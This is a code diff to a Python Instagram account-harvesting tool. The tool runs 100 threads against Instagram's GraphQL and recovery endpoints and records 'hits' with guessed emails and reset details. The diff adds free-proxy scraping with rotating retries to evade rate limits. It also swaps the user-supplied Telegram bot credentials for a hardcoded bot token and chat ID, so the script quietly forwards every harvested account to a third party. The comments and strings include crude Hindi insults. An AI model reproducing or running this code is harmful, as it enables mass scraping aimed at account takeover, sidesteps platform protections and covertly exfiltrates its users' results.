@@ -1,4 +1,3 @@
-print("JOEKR RANDI KI FILE JO VO BS DESIGN CHANGE KRKE SELL KAR RHA")
 import datetime
 #import pytz
 
@@ -24,6 +23,7 @@ import uuid
 import time
 from datetime import datetime
 from threading import Thread
+from telegram import Bot
 import requests
 from requests import post as pp
 from user_agent import generate_user_agent
@@ -31,10 +31,41 @@ from random import choice, randrange
 from cfonts import render, say
 from colorama import Fore, Style, init
 import webbrowser
-webbrowser.open('https://t.me/aniisolo')
 
 webbrowser.open
 init(autoreset=True)
+
+def get_proxies():
+    proxy_sites = [
+        "https://www.proxyscrape.com/free-proxy-list",
+        "https://www.sslproxies.org/",
+        "https://free-proxy-list.net/",
+    ]
+    proxies = []
+    for site in proxy_sites:
+        try:
+            response = requests.get(site)
+            proxies += re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', response.text)
+        except Exception as e:
+            print(f"Failed to fetch proxies from {site}: {e}")
+    return proxies
+
+proxies = get_proxies()
+
+def get_random_proxy():
+    if proxies:
+        return {"http": f"http://{choice(proxies)}", "https": f"https://{choice(proxies)}"}
+    return None
+
+def request_with_proxy(url, headers=None, data=None):
+    proxy = get_random_proxy()
+    try:
+        response = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=10)
+        return response
+    except Exception as e:
+        print(f"Proxy error: {e}")
+        return request_with_proxy(url, headers, data)  # Retry with a new proxy
+
 
 INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
 IG_SIG_KEY_VERSION = 'ig_sig_key_version'
@@ -100,9 +131,16 @@ infoinsta = {}
 
 banner = render('Joker randi', colors=['white', 'blue'], align='center')
 
-ID = input("ID: ")
-TOKEN = input("Bot Token ")
-os.system('clear')
+TOKEN = "7570457500:AAFZAJ1jMnwkCG-KnUx4TNjBn2WMLi8e8z8"
+ID = 6698364560
+
+bot = Bot(token=TOKEN)
+
+def send_telegram_message(message):
+    bot.send_message(chat_id=ID, text=message)
+
+# Example Usage
+send_telegram_message("Hello! This is a test message.")
 
 def update_stats():
     # @Eiz0n ;
@@ -298,30 +336,38 @@ def InfoAcc(username, domain):
     account_info = infoinsta.get(username, {})
     user_id = account_info.get('pk')
     full_name = account_info.get('full_name')
-    followers = account_info.get('follower_count')
-    following = account_info.get('following_count')
-    posts = account_info.get('media_count')
-    bio = account_info.get('biography')
+    followers = account_info.get('follower_count', 0)
+    following = account_info.get('following_count', 0)
+    posts = account_info.get('media_count', 0)
+    bio = account_info.get('biography', 'N/A')
+    is_business = account_info.get('is_business', False)  # Check if the account is a business account
+
+    # Check if the account is Meta Enabled
+    meta_enabled = "Yes" if posts >= 4 and followers >= 50 else "No"
+    business_status = "Business" if is_business else "Personal"
+
     total_hits += 1
     info_text = f"""
-𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 ✔️
 ═════════════════
 𝐇𝐈𝐓 :  {total_hits}  
-𝐔𝐒𝐄𝐑𝐍𝐀𝐌 :  {username} 
-𝐄𝐌𝐀𝐈𝐋 : [ {username}@{domain} 
-𝐅𝐎𝐋𝐋𝐎𝐖𝐒: :  {followers} 
-𝐅𝐎𝐋𝐋𝐎𝐖𝐆: :  {following} 
-𝐏𝐎𝐒𝐓𝐒 :  {posts} 
-𝐃𝐀𝐓𝐄 :  ? 
-𝐏𝐈𝐎 : {bio} 
-𝐑𝐄𝐒𝐓 :  {rest(username)}
+𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 :  {username} 
+𝐄𝐌𝐀𝐈𝐋 :  {username}@{domain} 
+𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑𝐒: {followers}  
+𝐅𝐎𝐋𝐋𝐎𝐖𝐈𝐍𝐆: {following}  
+𝐏𝐎𝐒𝐓𝐒 : {posts}  
+𝐃𝐀𝐓𝐄 : {date(int(user_id))}  
+𝐁𝐈𝐎 : {bio}  
+𝐌𝐄𝐓𝐀 𝐄𝐍𝐀𝐁𝐋𝐄𝐃 : {meta_enabled}  
+𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐘𝐏𝐄 : {business_status}  
+𝐑𝐄𝐒𝐓 : {rest(username)}
 ═════════════════
- Join @aniisolo | Joker randi chuda kese
 """
     with open('hits.txt', 'a') as f:
         f.write(info_text + "\n")
+
+    # Send to Telegram bot
     try:
-        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
+        send_telegram_message(info_text)
     except Exception:
         pass
 
@@ -337,7 +383,7 @@ def eizon_python():
         }
         headers = {'X-FB-LSD': data['lsd']}
         try:
-            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
+            response = request_with_proxy('https://www.instagram.com/api/graphql', headers=headers, data=data)
             account = response.json().get('data', {}).get('user', {})
             username = account.get('username')
             if username:
@@ -350,5 +396,4 @@ def eizon_python():
 
 for _ in range(100):
     Thread(target=eizon_python).start()
-
 
